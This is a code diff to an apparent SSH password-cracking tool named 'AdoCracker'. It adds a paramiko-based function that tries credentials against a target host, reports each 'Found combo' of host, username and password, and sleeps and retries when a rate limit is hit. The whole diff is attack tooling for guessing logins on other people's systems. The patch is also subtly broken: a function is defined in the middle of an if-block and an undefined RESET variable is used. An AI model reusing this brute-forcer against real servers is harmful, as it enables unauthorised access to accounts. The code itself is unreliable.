@@ -1,3 +1,4 @@
+import os
 import socket
 import requests
 import sys
@@ -5,6 +6,7 @@ from pyfiglet import figlet_format
 import argparse
 import time
 import nmap
+import paramiko
 
 banner = "AdoCracker"
 print(figlet_format(banner, font="standard"))
@@ -158,24 +160,31 @@ if args.service == "ssh":
     target = args.attack
     port = args.port
     username = args.login
-    username_file = args.username_file
+    username_file = args.login_file
     password = args.password
     password_file = args.password_file
+    colon_file = args.colon_file
 
-    #Check if SSH port is open
-    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    location = (target, port)
+def is_ssh_open(hostname, username, password):
+    # initialize SSH client
+    client = paramiko.SSHClient()
+    # add to know hosts
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        print("\n\033[1;33m We are checking if port is open...")
-        conn = a_socket.connect_ex(location)
-        if conn == 0:
-            print("\n\033[1;33m Port is open... We proceed")
-        else:
-            print("\033[1;31m-------------------------------------------------"
-                  "\n Sorry port is not open, check again :(          "
-                  "\n-------------------------------------------------")
-        a_socket.close()
-    except:
-        print("\n\033[1;31m------------------------------------------"
-              "\n Please specify port for SSH                     "
-              "\n------------------------------------------")
+        client.connect(hostname=hostname, port=port, username=username, password=password, timeout=3)
+    except socket.timeout:
+        # this is when host is unreachable
+        print(f"[!] Host: {hostname} is unreachable, timed out.{RESET}")
+        return False
+    except paramiko.AuthenticationException:
+        print(f"[!] Invalid credentials for {username}:{password}")
+        return False
+    except paramiko.SSHException:
+        print(f"[*] Quota exceeded, retrying with delay...{RESET}")
+        # sleep for a minute
+        time.sleep(60)
+        return is_ssh_open(hostname, username, password)
+    else:
+        # connection was established successfully
+        print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
+        return True
